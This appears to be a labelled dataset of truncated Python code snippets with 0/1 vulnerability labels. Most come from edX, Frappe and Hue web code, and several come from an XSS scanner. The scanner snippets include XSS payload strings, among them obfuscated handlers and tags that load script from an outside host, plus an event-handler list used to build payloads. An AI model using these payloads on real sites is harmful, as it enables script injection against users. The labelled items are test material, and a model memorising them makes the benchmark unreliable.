url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$", "label": 0}, {"snippet_id": 8730, "code": "': 'RiceX'}), url(r'^(?i)university_profile/ANUx$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'ANUx'}), url(r'^(?i)university_profile/EPFLx$', 'courseware", "label": 0}, {"snippet_id": 31635, "code": "=0.9 \t\tp[serv].y_range.start=0 \t\tp[serv].y_range.end=int(df['conn'].max()) +150 \t\tp[serv].add_tools(hover) \t\tp[serv].title.text_font_size=\"20px\"\t\t\t\t \t\tp[serv].line(\"Date\", \"conn\", source=source, alpha=0", "label": 0}, {"snippet_id": 1096, "code": "\"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) result", "label": 0}, {"snippet_id": 23949, "code": " test_verbosity_settings_1_process(self): \"\"\" Using 1 process means paver should ask for the traditional xunit plugin for plugin results \"\"\" expected_verbosity_string=( \"--with-xunit --xunit-file={repo_dir}", "label": 0}, {"snippet_id": 25828, "code": " label=q.question, required=q.required, help_text=help_text, initial=initial.file if initial else None, widget=UploadedFileWidget(position=pos, event=event, answer=initial), ) elif q.type==Question.TYPE_DATE", "label": 0}, {"snippet_id": 41376, "code": "(filters.blogger)) \t\tif filters.blog_category: \t\t\tconditions.append('t1.blog_category=\"%s\"' % frappe.db.escape(filters.blog_category)) \tif txt: \t\tconditions.append('(t1.content like \"%{0}%\" or t1.title", "label": 0}, {"snippet_id": 14414, "code": "(?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores'), url(r'^gitreload$', 'lms_migration.migrate.gitreload'), url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.gitreload'", "label": 0}, {"snippet_id": 44865, "code": " @check_document_access_permission() def workflow_parameters(request): response={'status': -1} try: workflow=Workflow(document=Document2.objects.get(type='oozie-workflow2', uuid=request.GET.get('uuid')", "label": 0}, {"snippet_id": 41552, "code": ", sys from frappe import _ from frappe.utils import(cint, flt, now, cstr, strip_html, \tsanitize_html, sanitize_email, cast_fieldtype) from frappe.model import default_fields from frappe.model.naming import", "label": 0}, {"snippet_id": 38297, "code": " \tif conditions: \t\tfrappe.local.no_cache=1 \tquery=\"\"\"\\ \t\tselect \t\t\tt1.title, t1.name, t1.blog_category, t1.route, t1.published_on, \t\t\t\tt1.published_on as creation, \t\t\t\tt1.content as content, \t\t\t\tifnull", "label": 0}, {"snippet_id": 11103, "code": "(self): \"\"\" Loads data into database from db_fixtures \"\"\" print 'Loading data from json fixtures in db_fixtures directory' sh( \"DEFAULT_STORE={default_store}\" \"./manage.py lms --settings bok_choy loaddata", "label": 0}, {"snippet_id": 22045, "code": "'ENABLE_INSTRUCTOR_BACKGROUND_TASKS'): urlpatterns +=( url(r'^instructor_task_status/$', 'instructor_task.views.instructor_task_status', name='instructor_task_status'), ) if settings.MITX_FEATURES.get(", "label": 0}, {"snippet_id": 12198, "code": "<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.pdf_index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter", "label": 1}, {"snippet_id": 34823, "code": "=get_table_columns(self.doctype) \t\t\telse: \t\t\t\tvalid=self.meta.get_valid_columns() \t\t\tfrappe.local.valid_columns[self.doctype]=valid \t\treturn frappe.local.valid_columns[self.doctype] \tdef is_new(self): \t\treturn self", "label": 0}, {"snippet_id": 42969, "code": " docname) \t\t\t\t\tif not values.name: \t\t\t\t\t\tinvalid_links.append((df.fieldname, docname, get_msg(df, docname))) \t\t\t\t\telif(df.fieldname !=\"amended_from\" \t\t\t\t\t\tand(is_submittable or self.meta.is_submittable", "label": 0}, {"snippet_id": 19403, "code": " \"\"\" expected_verbosity_string=( \"--with-xunit --xunit-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml --verbosity=2\".format( repo_dir=REPO_DIR, shard_str='/shard_' +self.shard if self.shard else", "label": 0}, {"snippet_id": 25550, "code": ", if the corresponding setting is enabled, as well as additional questions defined by the organizer. \"\"\" def __init__(self, *args, **kwargs): \"\"\" Takes two additional keyword arguments: :param cartpos:", "label": 0}, {"snippet_id": 1658, "code": " ast.literal_eval(json.dumps(data)) except: print \"Falied to parse\" print \"Data\",data try: if data['id']==\"NA\": all_data={'url': data['url'], 'impact': data['impact'], 'name': data['name'], 'req_headers", "label": 0}, {"snippet_id": 32884, "code": "('<a class=\"Breadcrumbs-crumb\">%s</a>\\n' % self.path) self.wfile.write('</div>\\n') for _, dirs, files in os.walk(full_path): for f in sorted(files): if f.startswith('.'): continue if f.endswith('.md'):", "label": 1}, {"snippet_id": 51276, "code": " **kwargs) class ConfigAdmin(ConstanceAdmin): change_list_form=CustomConfigForm change_list_template='admin/config/settings.html' admin.site.unregister([Config]) admin.site.register([Config], ConfigAdmin", "label": 0}, {"snippet_id": 7590, "code": "+)/book/(?P<book_index>[^/]*)/$', 'staticbook.views.index', name=\"book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.index'), url(r'^courses", "label": 1}, {"snippet_id": 18508, "code": "'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$', 'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/", "label": 0}, {"snippet_id": 34822, "code": "=get_table_columns(self.doctype) \t\t\telse: \t\t\t\tvalid=self.meta.get_valid_columns() \t\t\tfrappe.local.valid_columns[self.doctype]=valid \t\treturn frappe.local.valid_columns[self.doctype] \tdef is_new(self): \t", "label": 0}, {"snippet_id": 38478, "code": " load_doctype_module from frappe.model import display_fieldtypes from frappe.model.db_schema import type_map, varchar_len from frappe.utils.password import get_decrypted_password, set_encrypted_password _classes={}", "label": 0}, {"snippet_id": 52547, "code": "(_property['name'], _property['value']) for _property in properties])) if copied_properties: _properties.update(copied_properties) response['status']=0 response['properties']=_properties response['name']='%s-%s", "label": 0}, {"snippet_id": 14277, "code": ".logo', name='openid-logo'), ) if settings.MITX_FEATURES.get('AUTH_USE_SHIB'): urlpatterns +=( url(r'^shib-login/$', 'external_auth.views.shib_login', name='shib-login'), ) if settings.MITX_FEATURES.get", "label": 0}, {"snippet_id": 25928, "code": "=get_format_without_seconds('TIME_INPUT_FORMATS')), ) field.question=q if answers: field.answer=answers[0] self.fields['question_%s' % q.id]=field responses=question_form_fields.send(sender=event, position=pos) data", "label": 0}, {"snippet_id": 54837, "code": ".get_object().author class ArticleDelete(UserPassesTestMixin, DeleteView): \"\"\"\u5904\u7406\u5220\u9664Article\u7684\u64cd\u4f5c\"\"\" model=Article success_url='/' def test_func(self): return self.request.user==self.get_object().author class", "label": 0}, {"snippet_id": 8993, "code": "'^software-licenses$', 'licenses.views.user_software_license', name=\"user_software_license\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/xqueue/(?P<userid>[^/]*)/(?P<mod_id>.*?)/(?P<dispatch>[^/]*)$", "label": 0}, {"snippet_id": 16718, "code": "<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book-shifted/(?P<page>[^/]*)$', 'staticbook.views.index_shifted'), url(r'^courses/(?P<course_id>[^", "label": 1}, {"snippet_id": 4684, "code": "'onanimationiteration', 'onanimationstart', 'onbeforecopy', 'onbeforecut', 'onbeforeload', 'onbeforepaste', 'onbeforescriptexecute', 'onbeforeunload', 'onbegin', 'onblur', 'oncanplay', 'oncanplaythrough', ", "label": 0}, {"snippet_id": 38425, "code": ".avatar or \"\" \t\tpost.category=frappe.db.get_value('Blog Category', post.blog_category, \t\t\t['route', 'title'], as_dict=True) \t\tif post.avatar and(not \"http:\" in post.avatar and not \"https:\" in post.avatar", "label": 0}, {"snippet_id": 21220, "code": "<course_id>[^/]+/[^/]+/[^/]+)/$', 'courseware.views.course_info', name=\"course_root\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$', 'courseware.views.course_info', name=\"info\"), url(r'^courses/(?P", "label": 0}, {"snippet_id": 22006, "code": ".manage_modulestores'), url(r'^gitreload$', 'lms_migration.migrate.gitreload'), url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.gitreload'), ) if settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'):", "label": 0}, {"snippet_id": 39903, "code": " cancelled_links \tdef _validate_selects(self): \t\tif frappe.flags.in_import: \t\t\treturn \t\tfor df in self.meta.get_select_fields(): \t\t\tif df.fieldname==\"naming_series\" or not(self.get(df.fieldname) and df.options)", "label": 0}, {"snippet_id": 10792, "code": " DEFAULT_VERBOSITY) self.num_processes=kwargs.get('num_processes', DEFAULT_NUM_PROCESSES) self.verify_xss=kwargs.get('verify_xss', os.environ.get('VERIFY_XSS', False)) self.extra_args=kwargs.get('extra_args', '')", "label": 1}, {"snippet_id": 37648, "code": ".db.escape(filters.blogger)) \t\tif filters.blog_category: \t\t\tconditions.append('t1.blog_category=\"%s\"' % frappe.db.escape(filters.blog_category)) \tif txt: \t\tconditions.append('(t1.content like \"%{0}%\" or", "label": 0}, {"snippet_id": 35824, "code": ", self.name).as_dict() \t\tfor key in self.as_dict(): \t\t\tdf=self.meta.get_field(key) \t\t\tdb_value=db_values.get(key) \t\t\tif df and not df.allow_on_submit and(self.get(key) or db_value): \t\t\t\tif df.fieldtype", "label": 0}, {"snippet_id": 26347, "code": ", _('Your VAT ID could not be checked, as the VAT checking service of ' 'your country is currently not available. We will therefore ' 'need to charge VAT on your invoice. You can get the tax amount ' 'back", "label": 0}, {"snippet_id": 51567, "code": "'django.template.context_processors.request', 'django.contrib.auth.context_processors.auth', 'django.contrib.messages.context_processors.messages', ], }, }, ] WSGI_APPLICATION='dashboard.wsgi.application", "label": 0}, {"snippet_id": 20510, "code": "{zipped_course}'.format( tar_gz_file=self.tar_gz_file, zipped_course=zipped_course, ) ) msg=colorize('green', \"Uncompressing the test course...\") print msg sh( 'tar zxf{zipped_course} -C{courses_dir}'.format", "label": 0}, {"snippet_id": 19266, "code": " self.assertEqual(suite.cmd, self._expected_command(name=name)) def test_testcase_spec(self): spec='test_foo.py:FooTest.test_bar' suite=BokChoyTestSuite('', test_spec=spec) name='tests/{}'.format(spec)", "label": 0}, {"snippet_id": 2093, "code": "\": \"Cross Site Scripting via referer header\", \"impact\": impact, \"req_headers\": temp_headers, \"req_body\":body, \"res_headers\": ref_header_xss.headers,\"res_body\": ref_header_xss.text} dbupdate.insert_record", "label": 0}, {"snippet_id": 16049, "code": " settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'): admin.autodiscover() urlpatterns=('', url(r'^update_certificate$', 'certificates.views.update_certificate'), url(r'^$', 'branding", "label": 0}, {"snippet_id": 27500, "code": " to the main navigation.\"\"\" _MENU_ITEMS.append(_MenuItem(name, href)) def make_login_url(dest_url): \"\"\"Make the switch account url.\"\"\" return '/login?' +urllib.parse.urlencode({'dest': dest_url}) def make_logout_url", "label": 0}, {"snippet_id": 16897, "code": "'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$', 'courseware.views.progress', name=\"progress\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id>[^/]*)/$', 'courseware.views", "label": 0}, {"snippet_id": 34381, "code": "=_filter(self.__dict__.get(key,[]), filters, limit=limit) \t\t\t\telse: \t\t\t\t\tdefault=filters \t\t\t\t\tfilters=None \t\t\t\t\tvalue=self.__dict__.get(key, default) \t\t\telse: \t\t\t\tvalue=self.__dict__.get(key, default) \t\t", "label": 0}, {"snippet_id": 5718, "code": " onerror=confir\\u006d`1`>', '<svg/onload=co\\u006efir\\u006d`1`>', '<?xml version=\"1.0\"?><html><script xmlns=\"http://www.w3.org/1999/xhtml\">alert(1)</script></html>', '<scriscriptpt>alert(/xss/)</scriscriptpt>'", "label": 0}, {"snippet_id": 39376, "code": "\t\t\t\tself.db_insert() \t\t\t\t\t\treturn \t\t\t\t\traise frappe.DuplicateEntryError(self.doctype, self.name, e) \t\t\t\telif \"Duplicate\" in cstr(e.args[1]): \t\t\t\t\t \t\t\t\t\tself.show_unique_validation_message(e) \t\t\t\telse: ", "label": 0}, {"snippet_id": 35845, "code": "\t\t\tif df.fieldtype==\"Table\": \t\t\t\t\t \t\t\t\t\t \t\t\t\t\tself_value=len(self.get(key)) \t\t\t\t\tdb_value=len(db_value) \t\t\t\telse: \t\t\t\t\tself_value=self.get_value(key) \t\t\t\tif self_value !=db_value: \t\t\t\t\tfrappe.throw(_(\"Not", "label": 0}, {"snippet_id": 52518, "code": " response={'status': -1} node=json.loads(request.POST.get('node', '{}')) properties=json.loads(request.POST.get('properties', '{}')) copied_properties=json.loads(request.POST.get('copiedProperties', '{}'", "label": 0}, {"snippet_id": 13550, "code": "'^software-licenses$', 'licenses.views.user_software_license', name=\"user_software_license\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/xqueue/(?P<userid>[^/]*)/(?P<mod_id>.*?)/(?P<dispatch>[^/]*)$", "label": 0}, {"snippet_id": 9331, "code": "=\"student_progress\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$', 'instructor.views.instructor_dashboard', name=\"instructor_dashboard\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+", "label": 0}, {"snippet_id": 2964, "code": "\"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) result,db_update=True,True vul_param +=key else: result=True if", "label": 0}, {"snippet_id": 13206, "code": "'student.views.password_reset_confirm_wrapper', name='auth_password_reset_confirm'), url(r'^password_reset_complete/$', django.contrib.auth.views.password_reset_complete, name='auth_password_reset_complete", "label": 0}, {"snippet_id": 8766, "code": "', 'static_template_view.views.render', {'template': '404.html'}, name=\"404\"), ) if not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: urlpatterns +=( url(r'^jobs$', 'static_template_view.views.render', {", "label": 0}, {"snippet_id": 31038, "code": " tmp_config_path, script)) \tif error: \t\tprint('error: '+error) \t\tsys.exit() \tfunct.upload(slave, tmp_config_path, script) \tfunct.ssh_command(master,[\"sudo chmod +x \"+tmp_config_path+script, tmp_config_path+script+", "label": 0}, {"snippet_id": 45423, "code": ".errors)) else: parameters=coordinator.find_all_parameters() initial_params=ParameterForm.get_initial_params(dict([(param['name'], param['value']) for param in parameters])) params_form=ParametersFormSet", "label": 0}, {"snippet_id": 47735, "code": ".islower(): return False return True def recreate_form(reason: str): return redirect('/admin/users/edit?fault=' +str(reason)) def action_save_user(request: HttpRequest, default_forward_url: str=\"/admin/users\"", "label": 0}, {"snippet_id": 6858, "code": " because the SAMLRequest, RelayState and possibly other needed information will be forgotten. \"\"\" return self.config.getint(self.section, 'login_state_ttl') @property def default_scoped_affiliation(self): ", "label": 0}, {"snippet_id": 8803, "code": ".render', {'template': 'media-kit.html'}, name=\"media-kit\"), url(r'^faq$', 'static_template_view.views.render', {'template': 'faq.html'}, name=\"faq_edx\"), url(r'^help$', 'static_template_view.views.render", "label": 0}, {"snippet_id": 41050, "code": ": \t\t \t\tif not cint(self.published): \t\t\traise Exception(\"This blog has not been published yet!\") \t\t \t\tcontext.full_name=get_fullname(self.owner) \t\tcontext.updated=global_date_format(self.published_on) \t", "label": 0}, {"snippet_id": 52615, "code": " '') if request.fs.do_as_user(request.user, request.fs.exists, script_path): data=request.fs.do_as_user(request.user, request.fs.read, script_path, 0, 16 * 1024 ** 2) if node_data['type'] in('hive', 'hive2", "label": 0}, {"snippet_id": 10170, "code": ") self.assertEqual(suite.cmd, self._expected_command(name=name)) def test_spec_with_draft_default_store(self): spec='test_foo.py' suite=BokChoyTestSuite('', test_spec=spec, default_store='draft') name=", "label": 0}, {"snippet_id": 8187, "code": ".openid_login_complete', name='openid-complete'), url(r'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid-logo'), ) if settings.MITX_FEATURES.get('AUTH_USE_SHIB'): urlpatterns +=( url(r'^shib-login/$'", "label": 0}, {"snippet_id": 14332, "code": "'AUTH_USE_OPENID_PROVIDER'): urlpatterns +=( url(r'^openid/provider/login/$', 'external_auth.views.provider_login', name='openid-provider-login'), url(r'^openid/provider/login/(?:.+)$', 'external_auth.views.provider_identity'", "label": 0}, {"snippet_id": 41886, "code": "\treturn self.get(key, filters=filters, limit=1)[0] \tdef set(self, key, value, as_value=False): \t\tif isinstance(value, list) and not as_value: \t\t\tself.__dict__[key]=[] \t\t\tself.extend(key, value) \t\telse:", "label": 0}, {"snippet_id": 4352, "code": " url \"\"\" super(XSS, self).__init__() self.url=url @staticmethod def alterTest(self, p=False): return \"<script>alert(/xss/)</script>\" def img(self): return '<img/onerror=\"%s\"/src=x>' % payload def svg(self", "label": 1}, {"snippet_id": 14334, "code": ": urlpatterns +=( url(r'^openid/provider/login/$', 'external_auth.views.provider_login', name='openid-provider-login'), url(r'^openid/provider/login/(?:.+)$', 'external_auth.views.provider_identity', name", "label": 0}, {"snippet_id": 17075, "code": " name=\"add_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$', 'course_groups.views.users_in_cohort', name=\"list_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+", "label": 0}, {"snippet_id": 17502, "code": "'RUN_AS_ANALYTICS_SERVER_ENABLED'): urlpatterns +=( url(r'^edinsights_service/', include('edinsights.core.urls')), ) import edinsights.core.registry urlpatterns +=( url(r'^comm/foldit_ops', 'foldit.views.foldit_ops", "label": 0}, {"snippet_id": 30419, "code": ".getvalue('hour') \tminut=form.getvalue('minut') \thour1=form.getvalue('hour1') \tminut1=form.getvalue('minut1') \tdate=hour+':'+minut \tdate1=hour1+':'+minut1 \t \tif grep is not None: \tgrep_act ='|grep' \telse", "label": 0}, {"snippet_id": 7017, "code": ".views.pending_name_changes'), url(r'^event$', 'track.views.user_track'), url(r'^t/(?P<template>[^/]*)$', 'static_template_view.views.index'), url(r'^accounts/login$', 'student.views.accounts_login', name", "label": 0}, {"snippet_id": 17770, "code": "/$', django.contrib.auth.views.password_reset_complete, name='auth_password_reset_complete'), url(r'^password_reset_done/$', django.contrib.auth.views.password_reset_done, name='auth_password_reset_done", "label": 0}, {"snippet_id": 733, "code": "+parsed_url.query.replace(value[0], payload) xss_request=req.api_request(xss_url,\"GET\",headers) print xss_request.text if xss_request.text.find(payload) !=-1: impact=check_xss_impact(xss_request.headers", "label": 1}, {"snippet_id": 43056, "code": ".fieldname)).strip()) \t\t\tvalue=self.get(df.fieldname) \t\t\tif value not in options and not(frappe.flags.in_test and value.startswith(\"_T-\")): \t\t\t\t \t\t\t\tprefix=_(\"Row \t\t\t\tlabel=_(self.meta.get_label(df.fieldname)) ", "label": 0}, {"snippet_id": 40004, "code": ".meta.get(\"fields\",{\"set_only_once\":('=',1)})] \t\tif constants: \t\t\tvalues=frappe.db.get_value(self.doctype, self.name, constants, as_dict=True) \t\tfor fieldname in constants: \t\t\tdf=self.meta.get_field(fieldname", "label": 0}, {"snippet_id": 34096, "code": " string_types import datetime import frappe, sys from frappe import _ from frappe.utils import(cint, flt, now, cstr, strip_html, \tsanitize_html, sanitize_email, cast_fieldtype) from frappe.model import", "label": 0}, {"snippet_id": 51473, "code": "'websecmap.scanners', 'websecmap.reporting', 'websecmap.map', 'websecmap.pro', 'dashboard.internet_nl_dashboard', 'django_otp', 'django_otp.plugins.otp_static', 'django_otp.plugins.otp_totp', 'two_factor", "label": 0}, {"snippet_id": 54209, "code": "').grid(row=4) Label(main, text=\"Payload:\",background='light sky blue').grid(row=5) Label(main, text=\"HTTP Proxy:\",background='light sky blue').grid(row=6) Label(main, text=\"Refresh:\",background='light", "label": 0}, {"snippet_id": 35770, "code": "(value)) > max_length: \t\t\t\t\tif self.parentfield and self.idx: \t\t\t\t\t\treference=_(\"{0}, Row{1}\").format(_(self.doctype), self.idx) \t\t\t\t\telse: \t\t\t\t\t\treference=\"{0}{1}\".format(_(self.doctype), self.name) \t", "label": 0}, {"snippet_id": 48900, "code": "(self, smart_list_item, column, object): self.smart_list_item=smart_list_item self.column=column self.object=object def get_value(self): if self.column.render_function: return self.column.render_function", "label": 1}, {"snippet_id": 9067, "code": "\"mktg_about_course\"), url(r'^mktg/(?P<course_id>.*)$', 'courseware.views.mktg_course_about', name=\"mktg_about_course\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'courseware.views.course_info", "label": 0}, {"snippet_id": 241, "code": "\"res_headers\": xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) except: logs.logging.info(\"XSS: No GET param found!\") def xss_check(url,method,headers,body,scanid", "label": 0}, {"snippet_id": 20756, "code": " 'student.views.create_exam_registration'), url(r'^password_reset/$', 'student.views.password_reset', name='password_reset'), url(r'^password_change/$', django.contrib.auth.views.password_change, name=", "label": 0}, {"snippet_id": 46545, "code": ": template='admin_collections_m.mako' return render(template, request,{ 'is_embeddable': request.GET.get('is_embeddable', False), 'existing_hue_collections': existing_hue_collections, 'is_redirect': is_redirect", "label": 0}, {"snippet_id": 4974, "code": "'<sCriPt sRc=//t.cn>', '<embed//sRc=//t.cn>', '<base href=//t.cn/><script src=/>', '<object//data=//t.cn>', '<s=\" onclick=confirm``>clickme', '<svG oNLoad=co\\u006efirm& '\\'\"><y///oNMousEDown=((confirm)", "label": 0}, {"snippet_id": 6558, "code": "): \"\"\" Get list of tuples with packages and paths to content resources, such as login.html. The expected format in the INI file is content_packages=pkg1:some/path/, pkg2:foo :return: list of(pkg, path)", "label": 0}, {"snippet_id": 13835, "code": "]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/$', 'courseware.views.index', name=\"courseware_section\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>", "label": 0}, {"snippet_id": 14786, "code": "=BokChoyTestSuite('', verify_xss=True) name='tests' self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True)) def test_verify_xss_env_var(self): self.env_var_override.set('VERIFY_XSS', ", "label": 1}, {"snippet_id": 52821, "code": "=ParametersFormSet(initial=initial_params) popup=render('editor/submit_job_popup.mako', request,{ 'params_form': params_form, 'action': reverse('oozie:editor_submit_workflow', kwargs={'doc_id': workflow.id}) },", "label": 0}, {"snippet_id": 40742, "code": " display_fieldtypes: \t\t\t\tto_reset.append(df) \t\tif to_reset: \t\t\tif self.is_new(): \t\t\t\t \t\t\t\tref_doc=frappe.new_doc(self.doctype) \t\t\telse: \t\t\t\t \t\t\t\tif self.get('parent_doc'): \t\t\t\t\tself.parent_doc.get_latest", "label": 0}, {"snippet_id": 40621, "code": " Builder or in the controller as a list \t\tof hidden fields. Example \t\t\tclass MyDoc(Document): \t\t\t\tdef __setup__(self): \t\t\t\t\tself.print_hide=[\"field1\", \"field2\"] \t\t:param fieldname: Fieldname to be checked", "label": 0}, {"snippet_id": 50948, "code": " naturaltime from django.utils.safestring import mark_safe from django_celery_beat.admin import PeriodicTaskAdmin, PeriodicTaskForm from django_celery_beat.models import CrontabSchedule, PeriodicTask from", "label": 0}, {"snippet_id": 36129, "code": ".parentfield \t\tcache_key=parentfield or \"main\" \t\tif not hasattr(self, \"_precision\"): \t\t\tself._precision=frappe._dict() \t\tif cache_key not in self._precision: \t\t\tself._precision[cache_key]=frappe._dict() \t", "label": 0}, {"snippet_id": 39157, "code": " \"DocPerm\") and self.parent in(\"DocType\", \"DocField\", \"DocPerm\"): \t\t\t\tfrom frappe.model.meta import get_table_columns \t\t\t\tvalid=get_table_columns(self.doctype) \t\t\telse: \t\t\t\tvalid=self.meta.get_valid_columns", "label": 0}, {"snippet_id": 53250, "code": " return HttpResponse(json.dumps(popup), mimetype=\"application/json\") def _submit_coordinator(request, coordinator, mapping): try: wf_doc=Document2.objects.get(uuid=coordinator.data['properties']['workflow'", "label": 0}, {"snippet_id": 54912, "code": ".batch import forms from pontoon.batch.actions import ACTIONS_FN_MAP log=logging.getLogger(__name__) def update_stats(translated_resources, locale): \"\"\"Update stats on a list of TranslatedResource. \"\"\"", "label": 0}, {"snippet_id": 6646, "code": " for use with the /status URL. If this list is['*'], all usernames are allowed for /status. :return: list of usernames :rtype: list[string] \"\"\" if self._parsed_status_test_usernames: return self._parsed_status_test_usernames", "label": 0}, {"snippet_id": 49353, "code": "=SmartOrder(query_params=query_params, column_id=column_id, ordering_query_param=ordering_query_param) class SmartFilterValue(QueryParamsMixin, object): def __init__(self, field_name, label, value, query_params", "label": 0}, {"snippet_id": 7802, "code": ".progress', name=\"student_progress\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$', 'instructor.views.instructor_dashboard', name=\"instructor_dashboard\"), url(r'^courses/(?P<course_id>[^", "label": 0}, {"snippet_id": 36308, "code": "(fieldname)==0 and not self.meta.istable: \t\t\tprint_hide=( df and df.print_hide_if_no_value) or( meta_df and meta_df.print_hide_if_no_value) \t\tif not print_hide: \t\t\tif df and df.print_hide is not None: \t\t\t", "label": 0}, {"snippet_id": 50122, "code": "]=(now, True) self.lineSend(csessid,[\"ajax_keepalive\",[],{}]) for csessid in to_remove: sessions=self.sessionhandler.sessions_from_csessid(csessid) for sess in sessions: sess.disconnect() self.last_alive", "label": 0}, {"snippet_id": 52882, "code": "%s' %(_('The Oozie server is not running'), detail) LOG.error(smart_str(detail)) raise PopupException(_(\"Error submitting workflow %s\") %(workflow,), detail=detail) return redirect(reverse('oozie:list_oozie_workflow", "label": 0}, {"snippet_id": 38488, "code": " import type_map, varchar_len from frappe.utils.password import get_decrypted_password, set_encrypted_password _classes={} def get_controller(doctype): \t\"\"\"Returns the **class** object of the given DocType", "label": 0}, {"snippet_id": 14684, "code": ") name='tests/{}'.format(spec) self.assertEqual(suite.cmd, self._expected_command(name=name)) def test_class_spec(self): spec='test_foo.py:FooTest' suite=BokChoyTestSuite('', test_spec=spec) name='tests", "label": 0}, {"snippet_id": 20669, "code": ".views.change_name_request', name=\"change_name\"), url(r'^accept_name_change$', 'student.views.accept_name_change'), url(r'^reject_name_change$', 'student.views.reject_name_change'), url(r'^pending_name_changes$", "label": 0}, {"snippet_id": 3632, "code": ",scanid dbupdate.update_record({\"scanid\": scanid},{\"$set\":{\"scan_data\": vul_param+\" parameters are vulnerable to XSS\"}}) def xss_check(url,method,headers,body,scanid): if method=='GET' or method=='DEL'", "label": 0}, {"snippet_id": 30553, "code": "'apache_log_path') \t \tif grep is not None: \t\tgrep_act ='|grep' \telse: \t\tgrep_act='' \t\tgrep='' \t\t \tif serv=='haproxy-wi.access.log': \t\tcmd=\"cat %s| awk -F\\\"/|:\\\" '$3>\\\"%s:00\\\" && $3<\\\"%s:00\\\"' |tail -%s", "label": 0}, {"snippet_id": 18200, "code": ".views.course_info', name=\"course_root\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$', 'courseware.views.course_info', name=\"info\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$',", "label": 0}, {"snippet_id": 36985, "code": "\"select route from \t\t`tabBlog Post` where ifnull(published,0)=1\"\"\"): \t\tclear_cache(blog) \tclear_cache(\"writers\") def get_blog_category(route): \treturn frappe.db.get_value(\"Blog Category\",{\"name\": route}, ", "label": 0}, {"snippet_id": 41982, "code": " a dict or BaseDocument, not{2}({3})'.format(key, \t\t\t\t\tself.name, str(type(value))[1:-1], value) \t\t\t) \tdef extend(self, key, value): \t\tif isinstance(value, list): \t\t\tfor v in value: \t\t\t\tself.append(key", "label": 0}, {"snippet_id": 37706, "code": " `tabCommunication` \t\t\t\t\twhere \t\t\t\t\t\tcommunication_type='Comment' \t\t\t\t\t\tand comment_type='Comment' \t\t\t\t\t\tand reference_doctype='Blog Post' \t\t\t\t\t\tand reference_name=t1.name) as comments \t\tfrom `tabBlog Post` t1", "label": 0}, {"snippet_id": 7054, "code": "), url(r'^logout$', 'student.views.logout_user', name='logout'), url(r'^create_account$', 'student.views.create_account'), url(r'^activate/(?P<key>[^/]*)$', 'student.views.activate_account', name=\"activate", "label": 0}, {"snippet_id": 23197, "code": "/cohorts/(?P<cohort_id>[0-9]+)/delete$', 'course_groups.views.remove_user_from_cohort', name=\"remove_from_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$', 'course_groups.views", "label": 0}, {"snippet_id": 34145, "code": " get_decrypted_password, set_encrypted_password _classes={} def get_controller(doctype): \t\"\"\"Returns the **class** object of the given DocType. \tFor `custom` type, returns `frappe.model.document.Document`.", "label": 0}, {"snippet_id": 39470, "code": "\tfieldname, label=str(e).split(\"'\")[-2], None \t\t \t\t \t\tif \"unique_\" in fieldname: \t\t\tfieldname=fieldname.split(\"_\", 1)[1] \t\tdf=self.meta.get_field(fieldname) \t\tif df: \t\t\tlabel=df.label \t\tfrappe.msgprint(_", "label": 0}, {"snippet_id": 17216, "code": "/]+/[^/]+/[^/]+)/discussion/', include('django_comment_client.urls')) ) urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/(?P<tab_slug>[^/]+)/$', 'courseware.views.static_tab', name=\"static_tab", "label": 0}, {"snippet_id": 1563, "code": ": scanid, \"name\": name, 